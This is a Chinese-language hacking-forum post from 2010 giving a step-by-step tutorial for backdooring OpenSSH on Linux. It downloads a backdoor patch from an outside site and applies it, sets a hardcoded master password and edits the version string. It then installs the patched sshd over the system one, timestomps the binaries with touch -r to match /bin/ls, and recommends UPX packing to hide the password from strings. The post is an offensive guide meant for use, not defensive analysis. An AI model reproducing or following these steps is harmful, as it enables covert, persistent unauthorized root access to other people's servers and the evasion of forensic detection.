@@ -1,0 +1,70 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+LINUX下的openSSH后门的制作
+D8888D主贴内容-------------------------------------------------------
+LINUX下的openSSH后门的制作
+
+这个教程比较老了，自己零几年做的，一直没发过。
+大牛们不要扔砖头。
+
+功能很简单却很实用 telnet 后直接返回个ROOT SHELL
+
+我们先需要下载两个东西：
+一个是openssh-3.7.1p2.tar.gz的源码包
+一个是他的后门补丁ssh3.7.1p2.patch
+#wget [url=http://mirror.mcs.anl.gov/openssh/portable/openssh-3.7.1p2.tar.gz]链接标记http://mirror.mcs.anl.gov/openssh/portable/openssh-3.7.1p2.tar.gz[/url]
+
+#wget [url=http://pmd5.com/ssh.patch.txt]链接标记http://pmd5.com/ssh.patch.txt[/url]
+
+#patch < ../ssh3.7.1p2.patch   给他打上后门补丁
+
+
+#vi sshd.c    修改下默认的后门密码
+/define EVIL "admin"
+
+#vi version.h   修改一下版本号 与实际保持一致
+
+以前的老版本都没有用到PAM做认证
+看下自己的用到了没有
+#vi /etc/ssh/sshd_config
+#./configure --prefix=/usr --bindir=/usr/bin/ --sbindir=/usr/sbin/ --sysconfdir=/etc/ssh --with-pam ;make
+
+
+报错了
+因为老版本的不支持GSSAPI
+#vi /etc/ssh/sshd_config
+注释掉GSSAPI
+注释掉AcceptEnv
+
+
+#VI /etc/ssh/ssh_config
+注释掉GSSAPI
+
+
+#make install 
+
+修改一下创建时间
+#touch -r /bin/ls /usr/sbin/sshd
+#touch -r /bin/ls /usr/bin/ssh
+#ll /usr/bin/ssh /bin/ls   看时间同步了吧
+
+重起一下SSHD
+/etc/init.d/sshd restart
+
+有点小缺陷
+#strings /usr/sbin/sshd |grep admin 就可以显示密码了 大家可以简单的用UPX给它加个壳
+
+
+          
+
+ps:给大家推荐一个免费破md5的网站。
+                 [url=http://www.pmd5.com]链接标记www.pmd5.com[/url]
+
+附上详细编译安装制作教程。
+第一次在t00ls上发表原创，就不收费 了，希望对大家有所帮助。
+
+          by -- xiaok
+ [img]http://www.t00ls.net/images/attachicons/rar.gif[/img][url=http://www.t00ls.net/attachment.php?aid=NzIxOHxjM2U1NjFlN3wxMjg2NDgwNTQ4fGY2NDdweUZmTGZQVFlpQ1ExUHBybmNWd2Y0V01FeEpSNFhLUlhIZUczVDFReURR]链接标记linux下的openSSH后门的制作.rar[/url] (6.84 MB) 下载次数: 48
+
+2010-7-4 11:03
